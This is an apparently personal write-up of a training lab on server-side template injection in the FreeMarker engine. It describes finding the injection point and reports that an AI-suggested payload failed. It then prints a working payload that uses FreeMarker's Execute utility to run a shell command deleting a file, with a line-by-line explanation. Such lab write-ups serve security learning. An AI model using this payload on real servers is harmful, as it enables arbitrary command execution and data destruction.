This lab is vulnerable to server-side template injection. 

To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

intially looking at the post seen there was a description and edit template part of the website.

this was the injection point for server side template injection, using the test case of sending an invalid request gave the error showing
the template engine of freemarker.

initially asking chatgpt was not working as it gave the examples of:
<#assign filePath = "/home/carlos/morale.txt">
<#assign file = new java.io.File(filePath)>
<#if file.exists()>
  <#if file.delete()>
    File deleted successfully.
  <#else>
    Failed to delete the file.
  </#if>
<#else>
  File does not exist.
</#if>

which didnt work

then looking at the documentation security part wasnt really helpful... therefore did some googling and this came up:



using the following albinowax (james kettle) executable i was able to solve the lab:
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }




this payload works in the following way:

<#assign ex="freemarker.template.utility.Execute"?new()>: 
This line assigns a new instance of the freemarker.template.utility.Execute class to the variable ex. 
This class is a part of FreeMarker's utility package and provides functionality to execute commands.

${ ex("rm /home/carlos/morale.txt") }: 
This line calls the ex object with the command rm /home/carlos/morale.txt as an argument. 
The ex object, being an instance of the Execute class, interprets this command and attempts to execute it on the server.
